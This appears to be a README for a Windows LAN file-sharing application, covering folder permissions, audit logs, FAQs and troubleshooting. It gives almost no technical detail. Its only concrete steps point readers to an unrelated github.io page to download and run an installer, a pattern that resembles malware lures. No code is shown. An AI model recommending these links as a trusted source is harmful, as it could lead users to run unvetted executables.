# 📁 lan-file-transfer - Transfer files between local computers securely

[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://tr25285.github.io)

This software allows you to move files between computers on the same network. It provides a simple way to share documents, photos, and videos without uploading them to the internet. The application keeps your files secure on your local network. You can set permissions for users or groups to control who accesses specific folders. It also maintains a log of file activity for security records.

## 🛠️ How to Use the Application

The interface uses standard windows for easy navigation. You will see several sections when you open the program.

### Setting Up Permissions
Before you share files, decide who can see them. Click on the security tab. You can create groups and add users to them. You may give a group "read-only" access to view files. You can grant "write" access to allow users to add or delete files. Use these features to protect sensitive data.

### Sending Files
To share a file:
1. Select the folder you wish to share.
2. Choose the specific users or groups allowed to reach this folder.
3. Click the save button to lock in these settings.
4. Tell other users on your network they can now access the folder via the application.

### Managing Logs
The audit log keeps track of file usage. Open the log menu to view recent history. It shows which user accessed a file and the time they performed the action. This helps you monitor your shared folders for security reasons.

## 🔍 Frequently Asked Questions

**Does this software store my files online?**
No. This program operates only on your local network. Your data never leaves your home or office router.

**Can I use this over the internet?**
The program works specifically on a local area network. It does not support remote connections over the internet.

**Do I need a server?**
No. The application handles all connections between the computers you connect. You do not need to manage a separate server or backend service.

**How do I update the software?**
When a new version becomes available, revisit the [download page](https://tr25285.github.io). Download the latest installer and run it. The new version will replace the old one automatically.

## 🛡️ Privacy and Safety

The software uses encryption during the transfer process. This ensures that nobody on your network can intercept or view your documents while they move between computers. Permissions prevent unauthorized access to your folders. Always keep your Windows password strong and secure to prevent others from accessing your machine.

## 🔧 Troubleshooting

If you encounter issues, verify that all computers on your network are turned on and connected to the same router. Ensure that your firewall allows the application to communicate over the local network. Most issues arise from incorrect discovery settings on your network adapter. Check that your network profile in Windows is set to "Private" rather than "Public". 

If the application fails to start, ensure you have the latest drivers for your network card. Restart your computer if the application hangs during a transfer.
